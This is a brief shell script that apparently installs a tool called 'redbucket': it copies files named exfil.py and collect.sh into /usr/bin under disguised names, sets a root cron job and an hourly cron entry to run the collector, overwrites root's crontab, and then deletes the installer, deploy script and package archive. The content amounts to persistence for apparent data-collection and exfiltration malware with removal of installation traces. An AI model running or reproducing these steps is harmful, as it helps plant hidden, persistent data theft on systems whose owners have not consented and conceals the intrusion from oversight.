sudo mv exfil.py /usr/bin/redbucket_out
sudo mv collect.sh /usr/bin/redbucket_col
sudo chmod +x /usr/bin/redbucket_out /usr/bin/redbucket_col
sudo cp /usr/bin/redbucket_col /etc/cron.hourly
sudo chmod +x /etc/cron.hourly/redbucket_col
sudo echo "*/10 * * * * /bin/bash redbucket_col" | sudo crontab -u root -
rm installation.sh
rm deploy.sh
rm package.tar
